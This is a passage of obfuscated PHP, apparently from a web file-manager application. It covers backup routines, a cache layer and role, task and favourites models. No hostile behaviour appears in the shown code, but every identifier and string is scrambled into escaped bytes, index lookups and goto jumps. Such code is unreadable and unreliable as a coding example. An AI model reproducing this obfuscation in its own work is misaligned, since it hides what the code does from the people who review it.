|| !$ğŞÁ€æ[$æª¹Œ†Å[408]]) { return !1; } $‚¯Ğîåã = defined($æª¹Œ†Å[484]) ? USER_ID : $æª¹Œ†Å[207]; $ƒÚôµä = array($æª¹Œ†Å[43] => $æª¹Œ†Å[1068], $æª¹Œ†Å[1659] => $‚¯Ğîåã, $æª¹Œ†Å[104] => $Ç†¦ÁÁ›, $æª¹Œ†Å[383] => $Æ…• ó˜); $Ó®ùÇó… = $æª¹Œ†Å[1687]; CacheLock::lock($Ó®ùÇó…); Model($æª¹Œ†Å[456])->add($ƒÚôµä, array(), !0); CacheLock::unlock($Ó®ùÇó…); } public static function log($ÒÙ²Èù) { if (!GLOBAL_DEBUG) { return; } write_log($ÒÙ²Èù, $_SERVER[¹Û¹Æ€][1688]); } } goto bé¼œ’; d­Œ¤Ş“˜­: class BackupDbFile { public function __construct() { } public function index() { $§¢íââ =& $_SERVER[¹Û¹Æ€]; $È¼´õòÉ = Backup::get(); $Ù¢×½“Õ = $È¼´õòÉ[$§¢íââ[42]]; $œèÒ°æŠ = $this->tmpFilesPath() . "\x62\141\143\x6b\x75\x70\137{$Ù¢×½“Õ}\57"; $Œ‰û®ÆĞ = $this->backupPath($È¼´õòÉ); if (!($Œ‰û®ÆĞ = IO::mkdir($Œ‰û®ÆĞ))) { return !1; } $ëØ¶¥² = IO::listPath($œèÒ°æŠ); $˜Îƒ˜èˆ = isset($ëØ¶¥²[$§¢íââ[93]]) ? $ëØ¶¥²[$§¢íââ[93]] : array(); $ŠÅ¦Ñ’ñ = array_sum(array_column($˜Îƒ˜èˆ, $§¢íââ[86])); if (!$ŠÅ¦Ñ’ñ) { return !1; } $—¬ƒ÷œï = array($§¢íââ[796] => $ŠÅ¦Ñ’ñ, $§¢íââ[797] => time()); Backup::set($—¬ƒ÷œï); $ºò€…Æï = new TaskFileTransfer($§¢íââ[798], $§¢íââ[778], count($˜Îƒ˜èˆ), LNG($§¢íââ[779]) . $§¢íââ[395] . LNG($§¢íââ[781]) . $§¢íââ[799]); $ºò€…Æï->task[$§¢íââ[761]] = $ŠÅ¦Ñ’ñ; foreach ($ëØ¶¥²[$§¢íââ[93]] as $òğòø“) { $ƒåö¼û÷ = IO::move($òğòø“[$§¢íââ[94]], $Œ‰û®ÆĞ); if (!$ƒåö¼û÷) { $ºò€…Æï->end(); $¥œ¸ä¦‹ = IO::getLastError($§¢íââ[800] . $òğòø“[$§¢íââ[94]] . $§¢íââ[801] . $Œ‰û®ÆĞ . $§¢íââ[174]); write_log($¥œ¸ä¦‹, $§¢íââ[778]); return !1; } } $Æ¦Õ­åû = new DbManage(); $È®Ÿ—³ = $Æ¦Õ­åû->getSqlFile(); if (!$È®Ÿ—³[$§¢íââ[802]] || !$È®Ÿ—³[$§¢íââ[23]]) { return !1; } IO::move($È®Ÿ—³[$§¢íââ[802]], $Œ‰û®ÆĞ); IO::move($È®Ÿ—³[$§¢íââ[23]], $Œ‰û®ÆĞ); $ºò€…Æï->end(); $—¬ƒ÷œï = array($§¢íââ[803] => $ŠÅ¦Ñ’ñ, $§¢íââ[804] => time()); Backup::set($—¬ƒ÷œï); return !0; } private function backupPath($™Ú¿—æµ) { $ÇØøº”Ï =& $_SERVER[¹Û¹Æ€]; $®–Ö®× = $™Ú¿—æµ[$ÇØøº”Ï[42]]; $ù©ş‡ÓÇ = Model($ÇØøº”Ï[768])->get($ÇØøº”Ï[769]); $Öõá‰ = substr(md5($ÇØøº”Ï[770] . $ù©ş‡ÓÇ . $®–Ö®×), 0, 8); return "\x7b\151\157\72{$™Ú¿—æµ[$ÇØøº”Ï[750]]}\x7d\x2f\x64\x61\x74\141\x62\x61\x73\145\57\x62\x61\x63\153\x75\160\57" . $®–Ö®× . $ÇØøº”Ï[21] . $Öõá‰; } private function tmpFilesPath() { $”ü¢©­ =& $_SERVER[¹Û¹Æ€]; $ ’¿·Ô = TEMP_FILES; if ($GLOBALS[$”ü¢©­[16]][$”ü¢©­[99]][$”ü¢©­[794]]) { $ ’¿·Ô = $GLOBALS[$”ü¢©­[16]][$”ü¢©­[99]][$”ü¢©­[794]]; if (!mk_dir($ ’¿·Ô) || !is_writable($ ’¿·Ô) || !IO::mkfile($ ’¿·Ô . $”ü¢©­[795])) { $ ’¿·Ô = TEMP_FILES; } } return $ ’¿·Ô; } } class BackupFile { public function __construct() { } public function index() { $„¿ÒáÈš = Backup::get(); $ĞÕÂ‡¦™ = $„¿ÒáÈš[$_SERVER[¹Û¹Æ€][302]][$_SERVER[¹Û¹Æ€][209]][$_SERVER[¹Û¹Æ€][477]]; $›Ì­ù•Á = array($_SERVER[¹Û¹Æ€][478] => array($_SERVER[¹Û¹Æ€][805], $ĞÕÂ‡¦™), $_SERVER[¹Û¹Æ€][806] => array($_SERVER[¹Û¹Æ€][340], $„¿ÒáÈš[$_SERVER[¹Û¹Æ€][750]])); $´Æ×ÙÑ = (int) Model($_SERVER[¹Û¹Æ€][787])->where($›Ì­ù•Á)->count($_SERVER[¹Û¹Æ€][477]); $‚ë ‘á = (int) Model($_SERVER[¹Û¹Æ€][787])->where($›Ì­ù•Á)->sum($_SERVER[¹Û¹Æ€][86]); $é¼ÇÆÀü = new TaskFileTransfer($_SERVER[¹Û¹Æ€][807], $_SERVER[¹Û¹Æ€][778], $´Æ×ÙÑ, LNG($_SERVER[¹Û¹Æ€][779]) . $_SERVER[¹Û¹Æ€][780] . LNG($_SERVER[¹Û¹Æ€][808])); $é¼ÇÆÀü->task[$_SERVER[¹Û¹Æ€][761]] = $‚ë ‘á; $•äóª‚¶ = array($_SERVER[¹Û¹Æ€][809] => $´Æ×ÙÑ, $_SERVER[¹Û¹Æ€][810] => $‚ë ‘á, $_SERVER[¹Û¹Æ€][811] => time()); Backup::set($•äóª‚¶); $ˆò¶­îé = !0; $…ÀÔÜüÅ = $this->storeIds(); $äåµ¤²È = 1; $şÚÖŞ…® = 1000; $àå±Œæ¸ = $…­”çï‡ = 0; $êÒƒ³Àü = array(); $Â«çú±ª = $û„Ø¦Èß = 0; do { $º¤ú¨Ó = $_SERVER[¹Û¹Æ€][812]; $¹ığñÉ· = Model($_SERVER[¹Û¹Æ€][787])->where($›Ì­ù•Á)->field($º¤ú¨Ó)->order($_SERVER[¹Û¹Æ€][813])->selectPage($şÚÖŞ…®, $äåµ¤²È); $æö„ˆì  = !empty($¹ığñÉ·[$_SERVER[¹Û¹Æ€][378]]) ? $¹ığñÉ·[$_SERVER[¹Û¹Æ€][378]] : array(); foreach ($æö„ˆì  as $›÷„™—) { if (!$this->_fileExist($›÷„™—, $êÒƒ³Àü, $…ÀÔÜüÅ)) { $´Æ×ÙÑ -= 1; $‚ë ‘á -= (int) $›÷„™—[$_SERVER[¹Û¹Æ€][86]]; write_log("\146\x69\x6c\145\40\156\157\x74\40\145\x78\151\x73\164\x2e\x66\151\154\x65\111\x44\x3a{$›÷„™—[$_SERVER[¹Û¹Æ€][477]]}\x2c\x20\160\x61\x74\150\72{$›÷„™—[$_SERVER[¹Û¹Æ€][94]]}", $_SERVER[¹Û¹Æ€][814]); continue; } $¨Š»µŸ¬ = $›÷„™—[$_SERVER[¹Û¹Æ€][94]]; $ü÷Ò«† = "\173\151\x6f\x3a{$„¿ÒáÈš[$_SERVER[¹Û¹Æ€][750]]}\175" . substr($¨Š»µŸ¬, strlen("\x7b\151\x6f\72{$›÷„™—[$_SERVER[¹Û¹Æ€][815]]}\175")); if (IO::exist($ü÷Ò«†)) { $é¼ÇÆÀü->updateFileEnd($›÷„™—[$_SERVER[¹Û¹Æ€][42]], $›÷„™—[$_SERVER[¹Û¹Æ€][86]]); } else { $ü÷Ò«† = get_path_father($ü÷Ò«†); IO::mkdir($ü÷Ò«†); if (!IO::copy($¨Š»µŸ¬, $ü÷Ò«†, $_SERVER[¹Û¹Æ€][816])) { write_log($_SERVER[¹Û¹Æ€][817] . $¨Š»µŸ¬ . $_SERVER[¹Û¹Æ€][801] . $ü÷Ò«† . $_SERVER[¹Û¹Æ€][174], $_SERVER[¹Û¹Æ€][778]); $ˆò¶­îé = !1; break; } } $ĞÕÂ‡¦™ = $›÷„™—[$_SERVER[¹Û¹Æ€][477]]; $…­”çï‡ += 1; $àå±Œæ¸ += $›÷„™—[$_SERVER[¹Û¹Æ€][86]]; $û„Ø¦Èß += 1; $Â«çú±ª += $›÷„™—[$_SERVER[¹Û¹Æ€][86]]; if ($àå±Œæ¸ >= 1024 * 1024 * 100) { $•äóª‚¶ = array($_SERVER[¹Û¹Æ€][818] => $ĞÕÂ‡¦™, $_SERVER[¹Û¹Æ€][819] => $û„Ø¦Èß, $_SERVER[¹Û¹Æ€][820] => $Â«çú±ª); Backup::set($•äóª‚¶); $àå±Œæ¸ = $…­”çï‡ = 0; } } $ƒæ±»—Ô = count($æö„ˆì ); $äåµ¤²È++; } while ($ƒæ±»—Ô == $şÚÖŞ…®); $é¼ÇÆÀü->end(); $•äóª‚¶ = array($_SERVER[¹Û¹Æ€][821] => 1, $_SERVER[¹Û¹Æ€][506] => time(), $_SERVER[¹Û¹Æ€][773] => 1, $_SERVER[¹Û¹Æ€][818] => $ĞÕÂ‡¦™, $_SERVER[¹Û¹Æ€][810] => $‚ë ‘á, $_SERVER[¹Û¹Æ€][809] => $´Æ×ÙÑ, $_SERVER[¹Û¹Æ€][822] => time()); if ($…­”çï‡) { $•äóª‚¶[$_SERVER[¹Û¹Æ€][819]] = $û„Ø¦Èß; $•äóª‚¶[$_SERVER[¹Û¹Æ€][820]] = $Â«çú±ª; } Backup::set($•äóª‚¶); $this->_fileFilter($êÒƒ³Àü); return !0; } private function _fileExist($Æ’±ı, &$‰İ©İ¡º, $†è»ö) { $éÉ†²Ã =& $_SERVER[¹Û¹Æ€]; $õ‹­ï = $Æ’±ı[$éÉ†²Ã[94]]; if (in_array($Æ’±ı[$éÉ†²Ã[477]], $‰İ©İ¡º)) { return !1; } if (!in_array($Æ’±ı[$éÉ†²Ã[815]], $†è»ö)) { return !1; } if (IO::exist($õ‹­ï)) { return !0; } $ÛÆó£í = get_path_father($õ‹­ï); if (IO::exist($ÛÆó£í)) { $‰İ©İ¡º[] = $Æ’±ı[$éÉ†²Ã[477]]; return !1; } $ÎÑÉñù¬ = array($éÉ†²Ã[815] => $Æ’±ı[$éÉ†²Ã[815]], $éÉ†²Ã[94] => array($éÉ†²Ã[392], "{$ÛÆó£í}\45")); $öøŸ´Ó = Model($éÉ†²Ã[787])->where($ÎÑÉñù¬)->field($éÉ†²Ã[478])->select(); $‰İ©İ¡º = array_merge($‰İ©İ¡º, array_to_keyvalue($öøŸ´Ó, $éÉ†²Ã[22], $éÉ†²Ã[477])); return !1; } private function _fileFilter($€Ê¸àÇ) { $éñ”Î±é =& $_SERVER[¹Û¹Æ€]; if (empty($€Ê¸àÇ)) { return; } $€úá“½Œ = array($éñ”Î±é[477] => array($éñ”Î±é[17], array_unique($€Ê¸àÇ))); $±ŒğÅü¥ = Model($éñ”Î±é[823])->where($€úá“½Œ)->field($éñ”Î±é[411])->select(); foreach ($±ŒğÅü¥ as $ØŠ ØÒÖ) { Model($éñ”Î±é[823])->remove($ØŠ ØÒÖ[$éñ”Î±é[411]], !1); } } private function storeIds() { $¤±ÔÕõˆ =& $_SERVER[¹Û¹Æ€]; $°Ç¾ëë = Model($¤±ÔÕõˆ[765])->listData(); $µÌœ«ñÊ = array(); $Á“œ‡Ûö = $GLOBALS[$¤±ÔÕõˆ[16]][$¤±ÔÕõˆ[99]][$¤±ÔÕõˆ[824]]; foreach ($°Ç¾ëë as $îº¥½³”) { $á¨ÎÊ—± = strtolower($îº¥½³”[$¤±ÔÕõˆ[105]]); if (!isset($Á“œ‡Ûö[$á¨ÎÊ—±])) { continue; } $ Ú«öå„ = $¤±ÔÕõˆ[84] . (isset($Á“œ‡Ûö[$á¨ÎÊ—±]) ? $Á“œ‡Ûö[$á¨ÎÊ—±] : ucfirst($á¨ÎÊ—±)); if (!class_exists($ Ú«öå„)) { continue; } $µÌœ«ñÊ[] = $îº¥½³”[$¤±ÔÕõˆ[408]]; } return $µÌœ«ñÊ; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $¿Â«¨‘ç =& $_SERVER[¹Û¹Æ€]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $ë°†“Øù = $GLOBALS[$¿Â«¨‘ç[16]][$¿Â«¨‘ç[358]]; $Î¥Ÿ¬Ï… = $ë°†“Øù[$ë°†“Øù[$¿Â«¨‘ç[825]]]; $èéúé¡¶ = $ë°†“Øù[$¿Â«¨‘ç[826]]; switch ($ë°†“Øù[$¿Â«¨‘ç[825]]) { case $¿Â«¨‘ç[31]: self::$handle = Model($¿Â«¨‘ç[827]); break; case $¿Â«¨‘ç[828]: self::$handle = new CacheRedis($Î¥Ÿ¬Ï…, $èéúé¡¶); break; case $¿Â«¨‘ç[829]: self::$handle = new CacheMemcached($Î¥Ÿ¬Ï…, $èéúé¡¶); break; case $¿Â«¨‘ç[209]: self::$handle = new CacheFile($Î¥Ÿ¬Ï…, $èéúé¡¶); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($¦ä†û®ß) { if (is_array($¦ä†û®ß) || is_object($¦ä†û®ß)) { $¦ä†û®ß = json_encode($¦ä†û®ß); } $¦ä†û®ß = rawurlencode($¦ä†û®ß); return md5(KOD_SITE_ID . $_SERVER[¹Û¹Æ€][21] . $¦ä†û®ß); } public static function get($åÇ©Š¾â, $ü”Ö©»ô = false) { $á³ˆşÎĞ = self::key($åÇ©Š¾â); if ($ü”Ö©»ô) { return unserialize(self::init()->get($á³ˆşÎĞ)); } if (!isset(self::$memoryCache[$á³ˆşÎĞ])) { $Šì«´ƒ€ = self::init()->get($á³ˆşÎĞ); self::$memoryCache[$á³ˆşÎĞ] = unserialize($Šì«´ƒ€); } return self::$memoryCache[$á³ˆşÎĞ]; } public static function set($ªı¼Šî·, $à²Ÿ§ØÎ, $úıî£ˆÁ = false) { $§ÏÆ¾Í¸ = self::key($ªı¼Šî·); if (isset(self::$memoryCache[$§ÏÆ¾Í¸]) && self::$memoryCache[$§ÏÆ¾Í¸] === $à²Ÿ§ØÎ) { return !0; } if ($úıî£ˆÁ === 0) { self::$memoryCache[$§ÏÆ¾Í¸] = $à²Ÿ§ØÎ; return !0; } CacheLock::lock($ªı¼Šî·); $‹»¼Êòé = self::init()->set($§ÏÆ¾Í¸, serialize($à²Ÿ§ØÎ), $úıî£ˆÁ); self::$memoryCache[$§ÏÆ¾Í¸] = $à²Ÿ§ØÎ; CacheLock::unlock($ªı¼Šî·); return $‹»¼Êòé; } public static function getCall($…şÊ¾Ç, $€ÎÖœÈğ, $ÎÅã€Ğå, $Î¯õúÙ† = array()) { $âĞˆ¨¶´ =& $_SERVER[¹Û¹Æ€]; $şî‚øĞÃ = self::get($…şÊ¾Ç); if ($şî‚øĞÃ || $şî‚øĞÃ === $âĞˆ¨¶´[22]) { return $şî‚øĞÃ; } $şî‚øĞÃ = call_user_func_array($ÎÅã€Ğå, $Î¯õúÙ†); $şî‚øĞÃ = $şî‚øĞÃ ? $şî‚øĞÃ : $âĞˆ¨¶´[22]; self::set($…şÊ¾Ç, $şî‚øĞÃ, $€ÎÖœÈğ); return $şî‚øĞÃ; } public static function remove($ò»Ÿë€ê) { $ş»ğ´  = self::key($ò»Ÿë€ê); unset(self::$memoryCache[$ş»ğ´ ]); self::clearTimeout(); CacheLock::lock($ò»Ÿë€ê); $ˆ—„¼›À = self::init()->remove($ş»ğ´ ); CacheLock::unlock($ò»Ÿë€ê); return $ˆ—„¼›À; } public static function removeMemory($ÏøÊ¹´) { $íÛÁµÌ = self::key($ÏøÊ¹´); unset(self::$memoryCache[$íÛÁµÌ]); } public static function clearMemory($ÔèÏÇ½¬ = false) { if ($ÔèÏÇ½¬) { $ÔèÏÇ½¬ = self::key($ÔèÏÇ½¬); unset(self::$memoryCache[$ÔèÏÇ½¬]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¹Û¹Æ€][830])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¹Û¹Æ€][831])) { self::init()->clearTimeout(); } } } goto e‹‡‰±¡™×; eÔ¹‡ˆ„: define($_SERVER[¹Û¹Æ€][247], 1); define($_SERVER[¹Û¹Æ€][248], 2); define($_SERVER[¹Û¹Æ€][249], 3); goto d¬‡ï¤´ƒó; A†¤Ó¨¤Ü: class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\155\56\162\157\154\x65\x4c\x69\163\164"; public $field = array("\156\141\x6d\145", "\141\x75\164\x68", "\x6c\x61\142\x65\154", "\144\151\163\x70\x6c\x61\x79", "\x73\171\163\164\145\155", "\x64\x65\x73\x63", "\151\147\x6e\x6f\x72\x65\105\170\164", "\x69\147\x6e\x6f\x72\x65\x46\151\x6c\145\x53\x69\172\x65", "\141\x64\x6d\151\156\151\x73\x74\162\x61\164\x6f\162", "\x73\157\x72\164"); public function listData($êòÍ¥èÎ = false, $‹çéì´Ü = "\x73\157\x72\x74", $¡ı–Ş« = false) { $Ğ‚«£”Ç =& $_SERVER[¹Û¹Æ€]; $´êÉå„ó = parent::listData($êòÍ¥èÎ, $‹çéì´Ü, $¡ı–Ş«); if (!$êòÍ¥èÎ) { foreach ($´êÉå„ó as $Ë‰ôˆ—¿ => $Œ¿Çƒ‡à) { if ($Œ¿Çƒ‡à[$Ğ‚«£”Ç[2047]] == 1) { $´êÉå„ó[$Ë‰ôˆ—¿][$Ğ‚«£”Ç[462]] = LNG($Ğ‚«£”Ç[2281]); } } } return $´êÉå„ó; } public function update($¥¾¡Ëş, $¾‘˜ÖÍ¤) { $³ÌüÌëì =& $_SERVER[¹Û¹Æ€]; $Ğã¼×Áì = parent::listData($¥¾¡Ëş); $âÁÏ¢Ş = $this->findByName($¾‘˜ÖÍ¤[$³ÌüÌëì[42]]); if (!$Ğã¼×Áì || $âÁÏ¢Ş && $âÁÏ¢Ş[$³ÌüÌëì[408]] != $Ğã¼×Áì[$³ÌüÌëì[408]]) { return !1; } if ($âÁÏ¢Ş[$³ÌüÌëì[2047]] == 1) { $¾‘˜ÖÍ¤ = array($³ÌüÌëì[42] => $¾‘˜ÖÍ¤[$³ÌüÌëì[42]], $³ÌüÌëì[1872] => $¾‘˜ÖÍ¤[$³ÌüÌëì[1872]]); } $this->filterAuth($¾‘˜ÖÍ¤[$³ÌüÌëì[422]]); return parent::update($¥¾¡Ëş, $¾‘˜ÖÍ¤); } public function remove($Õ©à‘†·) { $¥±àØš = parent::listData($Õ©à‘†·); if (!$¥±àØš || $¥±àØš[$_SERVER[¹Û¹Æ€][1282]]) { return !1; } return parent::remove($Õ©à‘†·); } public function add($Ä˜êñÂŠ) { $ë‚¥¿ãÛ =& $_SERVER[¹Û¹Æ€]; $­‹ç·© = $Ä˜êñÂŠ[$ë‚¥¿ãÛ[42]]; if ($this->findByName($­‹ç·©)) { return !1; } $üŸ†„ÔÍ = array($ë‚¥¿ãÛ[429] => $­‹ç·©, $ë‚¥¿ãÛ[1855] => $ë‚¥¿ãÛ[22], $ë‚¥¿ãÛ[1851] => $ë‚¥¿ãÛ[1859], $ë‚¥¿ãÛ[2282] => 1, $ë‚¥¿ãÛ[1854] => 0, $ë‚¥¿ãÛ[2283] => 0, $ë‚¥¿ãÛ[1853] => $this->getSort()); $Ä˜êñÂŠ = array_merge($üŸ†„ÔÍ, $Ä˜êñÂŠ); $this->filterAuth($Ä˜êñÂŠ[$ë‚¥¿ãÛ[422]]); return parent::insert($Ä˜êñÂŠ); } private function getSort() { $Àã”«ôë =& $_SERVER[¹Û¹Æ€]; $ÑÄ€ç–ù = parent::listData(); $×ôëŸã´ = array_to_keyvalue($ÑÄ€ç–ù, $Àã”«ôë[22], $Àã”«ôë[1873]); return empty($×ôëŸã´) ? 0 : max($×ôëŸã´) + 1; } private function filterAuth(&$Ö¨÷¬Ú€) { $ìÆĞÃÇ… =& $_SERVER[¹Û¹Æ€]; $Ò¼‹ÊŒå = array(); $Ä–Øµú = array_filter(explode($ìÆĞÃÇ…[60], $Ö¨÷¬Ú€)); foreach ($Ä–Øµú as $Ö¨÷¬Ú€) { $÷àïÀˆá = explode($ìÆĞÃÇ…[20], $Ö¨÷¬Ú€); if ($÷àïÀˆá[0] == $ìÆĞÃÇ…[2284] && $÷àïÀˆá[1] != $ìÆĞÃÇ…[1188]) { $ÈŞÚù¦å = $÷àïÀˆá[0] . $ìÆĞÃÇ…[20] . $÷àïÀˆá[1] . $ìÆĞÃÇ…[2285]; if (!in_array($ÈŞÚù¦å, $Ä–Øµú)) { $Ò¼‹ÊŒå[] = $ÈŞÚù¦å; } } $Ò¼‹ÊŒå[] = $Ö¨÷¬Ú€; } $Ö¨÷¬Ú€ = implode($ìÆĞÃÇ…[60], $Ò¼‹ÊŒå); } public function findRoleDefault() { $éŸã¬¤… =& $_SERVER[¹Û¹Æ€]; $‡³©œ¿ê = parent::listData(); $ğş¥¼² = !1; foreach ($‡³©œ¿ê as $áÅÌÃ¶) { if (!$áÅÌÃ¶ || $áÅÌÃ¶[$éŸã¬¤…[1871]] == $éŸã¬¤…[207] || $áÅÌÃ¶[$éŸã¬¤…[2047]] == 1) { continue; } if (strstr($áÅÌÃ¶[$éŸã¬¤…[422]], $éŸã¬¤…[2286])) { continue; } if (!strstr($áÅÌÃ¶[$éŸã¬¤…[422]], $éŸã¬¤…[2287])) { continue; } if (!$ğş¥¼²) { $ğş¥¼² = $áÅÌÃ¶; continue; } $ıÙ¿‹Šù = explode($éŸã¬¤…[60], $ğş¥¼²[$éŸã¬¤…[422]]); $‰»êÄ§ = explode($éŸã¬¤…[60], $áÅÌÃ¶[$éŸã¬¤…[422]]); if (count($ıÙ¿‹Šù) > count($‰»êÄ§)) { $ğş¥¼² = $áÅÌÃ¶; } } return $ğş¥¼² ? $ğş¥¼²[$éŸã¬¤…[408]] : $éŸã¬¤…[22]; } public function sort($©ŞÀÓÑ, $Ú“¯ä¶) { return parent::update($©ŞÀÓÑ, $Ú“¯ä¶); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\x6d\x2e\164\x61\163\x6b\114\x69\163\164"; public $field = array("\x6e\x61\155\x65", "\x74\x79\x70\x65", "\x65\x76\x65\x6e\164", "\164\151\155\x65", "\x64\x65\x73\143", "\x73\171\x73\164\145\155", "\x65\x6e\x61\142\x6c\145", "\154\x61\163\164\x52\x75\x6e", "\x73\157\162\164"); public function listData($Ğå ¬¶ô = false, $³—Â–ˆò = "\x73\157\x72\x74", $½æåØŒ¥ = false) { return parent::listData($Ğå ¬¶ô, $³—Â–ˆò, $½æåØŒ¥); } public function add($º÷à¹»ñ) { $«÷ÖŞŸ =& $_SERVER[¹Û¹Æ€]; $“åÏ¶ªÕ = $this->findByName($º÷à¹»ñ[$«÷ÖŞŸ[42]]); if ($“åÏ¶ªÕ) { return !1; } $º÷à¹»ñ[$«÷ÖŞŸ[1619]] = 0; $º÷à¹»ñ[$«÷ÖŞŸ[1873]] = $this->getSort(); return parent::insert($º÷à¹»ñ); } private function getSort() { $«•ôÕÀ =& $_SERVER[¹Û¹Æ€]; $˜ó¡©½å = parent::listData(); $áÂ©·’­ = array_to_keyvalue($˜ó¡©½å, $«•ôÕÀ[22], $«•ôÕÀ[1873]); return empty($áÂ©·’­) ? 0 : max($áÂ©·’­) + 1; } public function update($ˆÔÔñ, $‘Ü›ŠÂº) { $²¼òñú£ =& $_SERVER[¹Û¹Æ€]; $ ¼Õî¬ = $this->listData($ˆÔÔñ); $ş¬İÛ•ù = $this->findByName($‘Ü›ŠÂº[$²¼òñú£[42]]); if (!$ ¼Õî¬ || $ş¬İÛ•ù && $ş¬İÛ•ù[$²¼òñú£[408]] != $ ¼Õî¬[$²¼òñú£[408]]) { return !1; } return parent::update($ˆÔÔñ, $‘Ü›ŠÂº); } public function remove($ğ±ÂÁì, $Èé§› = false) { $ğı±ÌØˆ =& $_SERVER[¹Û¹Æ€]; $áŞ£´Èæ = $this->listData($ğ±ÂÁì); if (!$áŞ£´Èæ) { return; } if (!$Èé§› && $áŞ£´Èæ[$ğı±ÌØˆ[1282]] == $ğı±ÌØˆ[98]) { return !1; } return parent::remove($ğ±ÂÁì); } public function enable($Â­ŒÏ»³, $ı×Ëù‘Ë) { return $this->update($Â­ŒÏ»³, array($_SERVER[¹Û¹Æ€][2276] => $ı×Ëù‘Ë)); } public function run($âüå§Œ) { return $this->update($âüå§Œ, array($_SERVER[¹Û¹Æ€][2288] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\163\x65\162\x5f\146\x61\x76"; protected function cacheFunctionAlias($½¯áÛê») { $©Ù¯³Ùİ =& $_SERVER[¹Û¹Æ€]; return array($©Ù¯³Ùİ[1960] => array(USER_ID, $©Ù¯³Ùİ[2289])); } protected function listData() { $šş²Ùç =& $_SERVER[¹Û¹Æ€]; $«öĞÚé« = array($šş²Ùç[1650] => USER_ID, $šş²Ùç[493] => 0); $ùï’ĞÚ = $šş²Ùç[2290]; $Óï ‘¦ˆ = $this->field($ùï’ĞÚ)->where($«öĞÚé«)->order($šş²Ùç[2291])->select(); return $Óï ‘¦ˆ ? $Óï ‘¦ˆ : array(); } protected function resetCache() { } protected function listView() { $îƒ›’§ =& $_SERVER[¹Û¹Æ€]; $ÃìÖ§å = $this->listData(); $–ûÎÀ€´ = array_filter_by_field($ÃìÖ§å, $îƒ›’§[43], $îƒ›’§[425]); $‡‹§™¹È = array_to_keyvalue($–ûÎÀ€´, $îƒ›’§[22], $îƒ›’§[94]); if (!$‡‹§™¹È) { return $ÃìÖ§å; } $‡©«äóÔ = 2000; $¹›Ñ»º = array($îƒ›’§[426] => array($îƒ›’§[427], $‡‹§™¹È)); $ïü·üÅ¤ = Model($îƒ›’§[823])->listSource($¹›Ñ»º, $‡©«äóÔ); $ïü·üÅ¤ = array_merge($ïü·üÅ¤[$îƒ›’§[93]], $ïü·üÅ¤[$îƒ›’§[92]]); $ïü·üÅ¤ = array_to_keyvalue($ïü·üÅ¤, $îƒ›’§[411]); foreach ($ÃìÖ§å as $É€½©À´ => $ƒÀµÃ¬§) { $¼™Ô¥˜Ó = $ïü·üÅ¤[$ƒÀµÃ¬§[$îƒ›’§[94]]]; $¼™Ô¥˜Ó = $¼™Ô¥˜Ó ? $¼™Ô¥˜Ó : array(); $ÃìÖ§å[$É€½©À´] = array_merge($¼™Ô¥˜Ó, $ƒÀµÃ¬§); } return $ÃìÖ§å; } protected function addFav($Ç£¡Æ’, $¹¥…èÃú = '', $İ¾ÙÛş€ = "\163\157\165\x72\143\x65") { $ÚŸƒñÒ± =& $_SERVER[¹Û¹Æ€]; $¼¦£‘·Ì = array($ÚŸƒñÒ±[1650] => USER_ID, $ÚŸƒñÒ±[493] => 0, $ÚŸƒñÒ±[431] => $İ¾ÙÛş€, $ÚŸƒñÒ±[430] => $Ç£¡Æ’); if ($this->where($¼¦£‘·Ì)->find()) { return !1; } $¼¦£‘·Ì = array($ÚŸƒñÒ±[1650] => USER_ID, $ÚŸƒñÒ±[493] => 0); $ÕÈá†¾Î = $this->where($¼¦£‘·Ì)->max($ÚŸƒñÒ±[1873]); if (!$ÕÈá†¾Î) { $ÕÈá†¾Î = 0; } if (!$¹¥…èÃú && $İ¾ÙÛş€ == $ÚŸƒñÒ±[425]) { $ÓÛàœï† = Model($ÚŸƒñÒ±[1333])->where(array($ÚŸƒñÒ±[426] => $Ç£¡Æ’))->find(); if (!$ÓÛàœï†) { return !1; } $¹¥…èÃú = $ÓÛàœï†[$ÚŸƒñÒ±[42]]; } $¹¥…èÃú = $this->getAutoName($¹¥…èÃú); $Ã½ĞŸãŠ = array($ÚŸƒñÒ±[1650] => USER_ID, $ÚŸƒñÒ±[493] => 0, $ÚŸƒñÒ±[429] => $¹¥…èÃú, $ÚŸƒñÒ±[430] => $Ç£¡Æ’, $ÚŸƒñÒ±[431] => $İ¾ÙÛş€, $ÚŸƒñÒ±[1853] => $ÕÈá†¾Î + 1); return $this->add($Ã½ĞŸãŠ); } protected function remove($Óšâèç…) { $üüà¯¨Ë =& $_SERVER[¹Û¹Æ€]; $îğÌ§ = array($üüà¯¨Ë[1650] => USER_ID, $üüà¯¨Ë[428] => $Óšâèç…); return $this->where($îğÌ§)->delete(); } protected function removeByName($¯ºàäêÛ) { $Õ……«¤“ =& $_SERVER[¹Û¹Æ€]; $æã’Ú€µ = array($Õ……«¤“[1650] => USER_ID, $Õ……«¤“[429] => $¯ºàäêÛ, $Õ……«¤“[493] => 0); return $this->where($æã’Ú€µ)->delete(); } protected function rename($Ø™¤ƒ¿Ï, $õÁèÏşé) { $Ó¢ÄËû£ =& $_SERVER[¹Û¹Æ€]; if ($Ø™¤ƒ¿Ï == $õÁèÏşé) { return !1; } $ïşğ¹ª’ = $this->getAutoName($õÁèÏşé); if ($õÁèÏşé != $ïşğ¹ª’) { return !1; } $”×Õ›ù = array($Ó¢ÄËû£[1650] => USER_ID, $Ó¢ÄËû£[493] => 0, $Ó¢ÄËû£[42] => $Ø™¤ƒ¿Ï); return $this->where($”×Õ›ù)->save(array($Ó¢ÄËû£[42] => $õÁèÏşé)); } protected function resetSort($±Â¦İú•) { $ÏòÎÌ‰é =& $_SERVER[¹Û¹Æ€]; $±Â¦İú• = is_array($±Â¦İú•) ? $±Â¦İú• : array(); $ËÅá³…ì = array($ÏòÎÌ‰é[1650] => USER_ID); for ($”¤†Ì¯“ = 0; $”¤†Ì¯“ < count($±Â¦İú•); $”¤†Ì¯“++) { $ËÅá³…ì[$ÏòÎÌ‰é[428]] = 